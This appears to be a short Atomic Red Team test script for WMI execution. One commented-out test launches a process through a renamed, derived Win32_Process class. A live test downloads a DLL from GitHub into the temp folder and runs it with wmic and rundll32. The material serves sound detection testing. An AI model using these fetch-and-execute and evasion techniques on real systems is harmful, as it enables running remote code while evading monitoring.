#Atomic Test #8 - Create a Process using obfuscated Win32_Proces

# $Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath("Win32_Process"))
# $NewClass = $Class.Derive("Win32_Atomic")
# $NewClass.Put()
# Invoke-WmiMethod -Path Win32_Atomic -Name create -ArgumentList notepad.exe

# Cleanup Commands:
# $CleanupClass = New-Object Management.ManagementClass(New-Object Management.ManagementPath("#{new_class}"))
# try { $CleanupClass.Delete() } catch {}


#Atomic Test #9 - WMI Execute rundll32
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/bin/calc.dll?raw=true" -OutFile "$env:TEMP\calc.dll"
wmic /node:127.0.0.1 process call create "rundll32.exe $env:TEMP\calc.dll StartW"

# Cleanup Commands:
# taskkill /f /im calculator.exe#